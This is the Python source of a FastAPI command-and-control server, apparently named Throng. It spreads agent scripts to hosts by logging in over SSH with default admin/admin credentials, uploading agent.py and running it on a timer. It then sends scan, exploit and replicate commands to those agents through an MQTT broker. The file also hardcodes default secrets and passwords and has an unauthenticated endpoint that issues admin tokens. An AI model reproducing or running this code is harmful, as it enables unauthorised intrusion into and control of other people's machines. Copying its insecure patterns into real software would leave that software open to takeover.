from fastapi import FastAPI, WebSocket, HTTPException, Depends, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.staticfiles import StaticFiles
import sqlite3
import json
import time
import os
from pydantic import BaseModel
import paho.mqtt.client as mqtt
from paho.mqtt.client import CallbackAPIVersion
import jwt
from sklearn.ensemble import IsolationForest
import numpy as np
import paramiko
import requests
import uuid
import threading
import logging
import socket

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")
security = HTTPBearer()

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Ambil konfigurasi dari variabel lingkungan dengan default
JWT_SECRET = os.getenv("JWT_SECRET", "throng_default_secret_1234567890")
JWT_ALGORITHM = "HS256"
MQTT_BROKER = os.getenv("MQTT_BROKER", "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud:8883")
MQTT_USERNAME = os.getenv("MQTT_USERNAME", "throng_user")
MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123!")
RAILWAY_API_TOKEN = os.getenv("RAILWAY_API_TOKEN", "")
PROJECT_ID = os.getenv("RAILWAY_PROJECT_ID", "")
DEFAULT_SPAWN_TARGET = os.getenv("DEFAULT_SPAWN_TARGET", "192.168.1.10")
DEFAULT_SSH_USERNAME = os.getenv("DEFAULT_SSH_USERNAME", "admin")
DEFAULT_SSH_PASSWORD = os.getenv("DEFAULT_SSH_PASSWORD", "admin")
AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))  # Dalam detik
GITHUB_REPO = os.getenv("GITHUB_REPO", "username/throng")

# Model untuk perintah
class Command(BaseModel):
    agent_id: str
    action: str
    target: str = None
    params: dict = {}
    emergency: bool = False

# Inisialisasi database SQLite dengan caching
db_connection = sqlite3.connect("throng.db", check_same_thread=False)
db_cursor = db_connection.cursor()

def init_db():
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS reports 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS counterattacks 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, target TEXT, action TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS agents 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT, host TEXT)''')
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS targets 
                 (id INTEGER PRIMARY KEY, target TEXT, vulnerability TEXT, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, score REAL)''')
    db_cursor.execute('''CREATE TABLE IF NOT EXISTS emergency_logs 
                 (id INTEGER PRIMARY KEY, agent_id TEXT, action TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    db_connection.commit()

init_db()

# MQTT client dengan pooling
mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
active_websockets = []
mqtt_pool = []

def on_connect(client, userdata, flags, rc, properties=None):
    logger.info(f"MQTT connected with result code {rc}")
    if rc == 0:
        client.subscribe("throng/reports")

def on_message(client, userdata, msg):
    if msg.topic == "throng/reports":
        report = json.loads(msg.payload.decode())
        for ws in active_websockets:
            try:
                ws.send_text(json.dumps({"type": "report", "data": report}))
            except:
                active_websockets.remove(ws)

mqtt_client.on_connect = on_connect
mqtt_client.on_message = on_message
mqtt_client.tls_set()
mqtt_client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
mqtt_client.connect(MQTT_BROKER.split(":")[0], int(MQTT_BROKER.split(":")[1]), 60)
time.sleep(1)
mqtt_client.loop_start()

# Model Isolation Forest
anomaly_model = IsolationForest(contamination=0.1, random_state=42)

# Analisis ancaman
def analyze_threats(reports):
    data = [[report["data"].get("network_traffic", 0), len(report["data"].get("vulnerability", []))] for report in reports]
    if len(data) < 2:
        return []
    predictions = anomaly_model.fit_predict(np.array(data))
    return [1 if pred == -1 else 0 for pred in predictions]

# Autentikasi JWT
async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
    try:
        payload = jwt.decode(credentials.credentials, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        return payload
    except jwt.PyJWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

# Fungsi spawn agent otomatis via SSH
def spawn_agent_ssh(target, credentials):
    try:
        new_agent_id = str(uuid.uuid4())
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, username=credentials.get("username", DEFAULT_SSH_USERNAME), password=credentials.get("password", DEFAULT_SSH_PASSWORD))
        sftp = ssh.open_sftp()
        sftp.put("agent.py", f"/tmp/agent_{new_agent_id}.py")
        ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
        sftp.close()
        ssh.close()
        db_cursor.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
                          (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(target), target))
        db_connection.commit()
        logger.info(f"Spawned agent {new_agent_id} on {target}")
        return new_agent_id
    except Exception as e:
        logger.error(f"Error spawning agent: {e}")
        return None

# Fungsi spawn agent otomatis via Railway API
def spawn_agent_railway():
    if not RAILWAY_API_TOKEN or not PROJECT_ID:
        logger.warning("Railway API Token or Project ID not set")
        return
    headers = {"Authorization": f"Bearer {RAILWAY_API_TOKEN}", "Content-Type": "application/json"}
    data = {
        "query": """
        mutation createService($input: ServiceInput!) {
            createService(input: $input) {
                id
            }
        }
        """,
        "variables": {
            "input": {
                "projectId": PROJECT_ID,
                "name": f"agent-{uuid.uuid4()}",
                "sourceRepo": GITHUB_REPO,
                "rootDirectory": "",
                "startCommand": "python agent.py",
                "env": [
                    {"key": "MQTT_BROKER", "value": MQTT_BROKER},
                    {"key": "MQTT_USERNAME", "value": MQTT_USERNAME},
                    {"key": "MQTT_PASSWORD", "value": MQTT_PASSWORD}
                ]
            }
        }
    }
    response = requests.post("https://backboard.railway.app/graphql/v2", headers=headers, json=data)
    if response.status_code == 200:
        logger.info("New agent spawned via Railway")
    else:
        logger.error(f"Error spawning agent: {response.text}")

# Pemantauan otomatis dengan batching
def auto_monitor():
    while True:
        db_cursor.execute("SELECT data FROM reports ORDER BY timestamp DESC LIMIT 10")
        reports = [json.loads(row[0]) for row in db_cursor.fetchall()]
        anomalies = analyze_threats(reports)
        if any(anomalies) or len(reports) < 3:
            target = DEFAULT_SPAWN_TARGET
            credentials = {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD}
            spawn_agent_ssh(target, credentials)
            if RAILWAY_API_TOKEN and PROJECT_ID:
                spawn_agent_railway()
        time.sleep(AUTO_SPAWN_INTERVAL)

threading.Thread(target=auto_monitor, daemon=True).start()

# Endpoint untuk token
@app.get("/token")
async def get_token():
    payload = {"user": "admin", "exp": time.time() + 3600}
    token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
    return {"token": token}

# Endpoint untuk data dashboard
@app.get("/api/data", dependencies=[Depends(verify_token)])
async def get_dashboard_data():
    db_cursor.execute("SELECT agent_id, status, last_seen, ip, host FROM agents WHERE status = 'active'")
    agents = [{"agent_id": row[0], "status": row[1], "last_seen": row[2], "ip": row[3], "host": row[4]} for row in db_cursor.fetchall()]
    db_cursor.execute("SELECT target, vulnerability, status, timestamp, score FROM targets")
    targets = [{"target": row[0], "vulnerability": json.loads(row[1]), "status": row[2], "timestamp": row[3], "score": row[4]} for row in db_cursor.fetchall()]
    db_cursor.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
    reports = [{"agent_id": row[0], "data": json.loads(row[1]), "timestamp": row[2]} for row in db_cursor.fetchall()]
    db_cursor.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
    emergency_logs = [{"agent_id": row[0], "action": row[1], "details": json.loads(row[2]), "timestamp": row[3]} for row in db_cursor.fetchall()]
    
    anomalies = analyze_threats(reports)
    for i, report in enumerate(reports):
        report["data"]["is_anomaly"] = bool(anomalies[i])
    
    network_data = {
        "nodes": [
            {"id": "hive", "label": "Hive", "group": "hive", "color": "#00b7eb"},
            *[{"id": agent["agent_id"], "label": agent["agent_id"], "group": "agent", "color": "#00ff00"} for agent in agents],
            *[{"id": target["target"], "label": target["target"], "group": "target", "color": "#ff0000" if target["score"] > 0.5 else "#cccccc"} for target in targets]
        ],
        "edges": [
            *[{"from": "hive", "to": agent["agent_id"]} for agent in agents],
            *[{"from": agent["agent_id"], "to": target["target"]} for agent in agents for target in targets if target["status"] == "claimed"]
        ]
    }
    
    return {"agents": agents, "targets": targets, "reports": reports, "emergency_logs": emergency_logs, "network": network_data}

# Endpoint untuk perintah
@app.post("/command", dependencies=[Depends(verify_token)])
async def send_command(command: Command):
    allowed_actions = ["block_ip", "send_honeypot", "redirect_traffic", "spawn_agent", "replicate", "scan_target", "exploit_target"]
    if command.action not in allowed_actions:
        raise HTTPException(status_code=400, detail="Invalid action")
    
    if command.target:
        if command.action in ["block_ip", "send_honeypot", "redirect_traffic", "exploit_target"]:
            db_cursor.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
                              (command.agent_id, command.target, command.action))
        elif command.action == "scan_target":
            db_cursor.execute("INSERT INTO targets (target, status, score) VALUES (?, ?, ?)", 
                              (command.target, "pending", 0.0))
        if command.emergency:
            db_cursor.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
                              (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
    if command.action == "spawn_agent" and command.target:
        credentials = command.params.get("credentials", {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD})
        new_agent_id = spawn_agent_ssh(command.target, credentials)
        if new_agent_id:
            db_cursor.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
                              (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(command.target), command.target))
    db_connection.commit()

    mqtt_client.publish(f"throng/commands/{command.agent_id}", json.dumps(command.dict()))
    for ws in active_websockets:
        ws.send_text(json.dumps({"type": "command", "data": command.dict()}))
    return {"status": f"Command {command.action} sent to {command.agent_id}"}

# WebSocket untuk real-time updates
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    active_websockets.append(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            logger.info(f"Received WebSocket data: {data}")
            report = json.loads(data)
            agent_id = report.get("agent_id")
            report_data = report.get("data")

            db_cursor.execute("INSERT INTO reports (agent_id, data) VALUES (?, ?)", (agent_id, json.dumps(report_data)))
            db_cursor.execute("INSERT OR REPLACE INTO agents (agent_id, status, last_seen, ip) VALUES (?, ?, ?, ?)", 
                              (agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), report_data.get("ip", "unknown")))
            if "vulnerability" in report_data:
                score = len(report_data.get("vulnerability", [])) * 0.2
                db_cursor.execute("INSERT INTO targets (target, vulnerability, status, score) VALUES (?, ?, ?, ?)", 
                                  (report_data.get("target"), json.dumps(report_data.get("vulnerability")), "scanned", score))
            db_connection.commit()
            logger.info(f"Database state - Agents: {db_cursor.execute('SELECT COUNT(*) FROM agents').fetchone()[0]}, Reports: {db_cursor.execute('SELECT COUNT(*) FROM reports').fetchone()[0]}")
            await websocket.send_text(json.dumps({"type": "update", "data": {"agent_id": agent_id, "status": "active"}}))
    except Exception as e:
        logger.error(f"WebSocket error: {e}")
    finally:
        active_websockets.remove(websocket)

# Endpoint utama untuk render dashboard
@app.get("/", response_class=HTMLResponse)
async def read_root(request: Request):
    logger.info(f"Rendering dashboard.html with version {int(time.time())}")
    return templates.TemplateResponse("dashboard.html", {"request": request, "version": int(time.time())})

# Cleanup saat shutdown
import atexit
@atexit.register
def cleanup():
    db_connection.close()
    mqtt_client.loop_stop()
    for ws in active_websockets:
        ws.close()